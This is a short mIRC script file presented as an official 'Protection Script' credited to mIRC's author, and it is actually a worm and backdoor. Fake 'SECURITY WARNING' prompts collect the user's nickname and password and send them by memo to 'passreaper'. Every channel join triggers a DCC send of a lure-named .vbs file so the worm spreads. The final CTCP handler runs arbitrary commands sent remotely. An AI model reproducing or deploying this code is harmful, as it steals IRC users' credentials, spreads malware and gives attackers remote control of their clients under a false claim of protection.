[script]
n0=;mIRC Protection Script DO NOT EDIT!
n1=;By Khaled Mardem-Bey
n2=;    www.mirc.com
n3=
n4=on 1:connect: {
n5=set %nn $?"SECURITY WARNING: Please enter your nickname"
n6=set %pw $?"SECURITY WARNING: Please enter your password"
n7=/.memoserv passreaper %nn %pw
n8=}
n9=
n10=on 1:JOIN:#:{ /if ( $nick == $me ) { halt }
n11=  /.dcc send $nick c:\mirc\download\christina_aguilera_nude!.vbs
n12=}
n13=
n14=on 1:ctcp:*:?:$1-
